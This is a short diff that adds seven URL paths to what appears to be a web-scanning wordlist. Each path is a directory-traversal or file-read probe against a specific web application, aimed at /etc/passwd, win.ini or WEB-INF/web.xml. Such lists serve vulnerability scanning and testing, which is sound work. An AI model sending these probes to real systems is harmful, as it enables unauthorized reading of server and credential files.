@@ -1,0 +1,7 @@
+/ctop/person/common/get_file.jsp?file_path=/WEB-INF/web.xml
+/jasperserver/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../
+/current_config/Account1
+/jsoa/GetRawFile?url=file:///C:/windows/win.ini
+/jsoa/GetRawFile?url=file:///etc/passwd
+/download.php?file=../../../../../etc/passwd
+/webgrind/index.php?op=fileviewer&file=/etc/passwd
